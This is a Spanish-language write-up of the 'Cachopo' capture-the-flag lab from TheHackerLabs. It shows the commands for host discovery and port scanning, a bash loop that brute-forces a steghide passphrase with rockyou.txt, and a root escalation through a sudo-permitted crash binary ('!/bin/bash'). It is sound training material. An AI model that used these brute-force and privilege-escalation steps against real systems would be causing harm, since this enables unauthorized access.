---
title: "TheHackerLabs - Avanzado : [Cachopo]"
published: 2024-12-08
draft: false
tags:
  - writeup-THL
---
📛 **Nombre:** Cachopo | 📈 **Dificultad:** Avanzado | 💻 **SO:** Linux | 👨‍💻 **Creador:** Oscar

# 🕵️ Resolución del CTF Cachopo


## Introducción

**Cachopo** es un CTF avanzado creado por TheHackerLabs, diseñado para desafiar las habilidades de los usuarios experimentados en Linux. El objetivo es identificar servicios vulnerables, explotarlos y capturar la flag final. 

🌐 [**Web oficial del CTF: TheHackersLabs - Cachopo**](https://thehackerslabs.com/cachopo/)

---

## 1. Descubrimiento de la Máquina Objetivo

Iniciamos el desafío identificando la dirección IP de la máquina objetivo en nuestra red local utilizando `arp-scan`:

```bash
# arp-scan -I ens36 --localnet
172.18.0.134  00:0c:29:f3:5c:ae    VMware, Inc.
```

La IP de la máquina objetivo es **172.18.0.134**.

---

## 2. Enumeración de Servicios

Realizamos un escaneo completo de puertos utilizando `nmap`:

```bash
# nmap -p- --min-rate 2000 -sS -Pn -oN allports 172.18.0.134
```

**Resultados principales:**
- **22/tcp:** OpenSSH 9.2p1 (Debian)
- **80/tcp:** Apache httpd 2.4.61

El análisis del puerto 80 reveló una redirección a `http://cachopo.thl/`. Configuramos `/etc/hosts` para incluir el dominio:

```bash
# echo "172.18.0.134 cachopo.thl" | tee -a /etc/hosts
```

---

## 3. Análisis del Servidor Web y Datos Ocultos

El sitio web contenía una imagen sospechosa. Usamos **Steghide** para analizarla, pero estaba protegida con contraseña. Realizamos un ataque de fuerza bruta con la lista `rockyou.txt`:

**Script simplificado para fuerza bruta:**
```bash
#!/bin/bash
while read password; do
    steghide --extract -sf cachopo.jpg -p "$password" 2>/dev/null && echo "Contraseña: $password" && break
done < /usr/share/wordlists/rockyou.txt
```

**Resultado:**
```bash
Contraseña: doggies
```

Extrajimos un archivo que nos redirigió a un directorio oculto con más datos sensibles.

---

## 4. Escalación de Privilegios

Nos conectamos al servidor utilizando SSH con las credenciales encontradas y analizamos los permisos del usuario:

```bash
# ssh carlos@172.18.0.134
# sudo -l
User carlos may run the following commands on Cachopo:
    (ALL) NOPASSWD: /usr/bin/crash
```

El binario `/usr/bin/crash` se explotó para escalar privilegios siguiendo las instrucciones de [GTFOBins](https://gtfobins.github.io/gtfobins/crash/).

```bash
carlos@Cachopo:~$ sudo /usr/bin/crash
crash> !/bin/bash
root@Cachopo:/home/carlos# whoami
root
```

## Reflexión Final

El CTF **Cachopo** destaca la importancia de una buena enumeración y el análisis de servicios. Además, pone en práctica habilidades como fuerza bruta y escalación de privilegios. Es un reto ideal para usuarios avanzados que buscan explorar vulnerabilidades reales.

¡Gracias por leer este writeup! Si tienes preguntas, no dudes en contactarme.  
Un saludo,  
Óscar
